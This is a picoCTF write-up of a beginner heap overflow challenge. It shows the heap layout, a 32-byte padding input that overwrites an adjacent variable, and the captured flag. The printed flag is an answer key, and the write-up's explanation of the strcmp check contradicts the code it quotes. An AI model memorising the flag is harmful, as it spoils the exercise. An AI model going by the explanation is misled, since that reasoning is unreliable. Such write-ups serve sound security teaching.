# URL
https://play.picoctf.org/practice/challenge/438?category=6&page=1
# Challenge
Are overflows just a stack concern?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc tethys.picoctf.net 65199
# Method of Solving
```
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x6497569f82b0  ->   pico
+-------------+----------------+
[*]   0x6497569f82d0  ->   bico
+-------------+----------------+
```
* Using hexmath bico is ahead of pico by 32 bytes: 0x6497569f82d0 - 0x6497569f82b0  = 0x20 = 32 bytes
* Since the buffer starts at pico, 32 bytes of unfiltered data should get us to bico, which can be used to set safe_var
```
  iVar1 = strcmp(safe_var,"pico");
  if (iVar1 != 0) { print flag }
```
* So in the code above, following the logic, the variable safe_var should be equal to "pico", then if they are lexically similar, it would print the flag
```
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```
* Now bico = safe_var = "pico"
* Now that pico = pico, the string check is passed which can return the flag
* Entering choice 4 gets us the flag!
```
Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49}
```
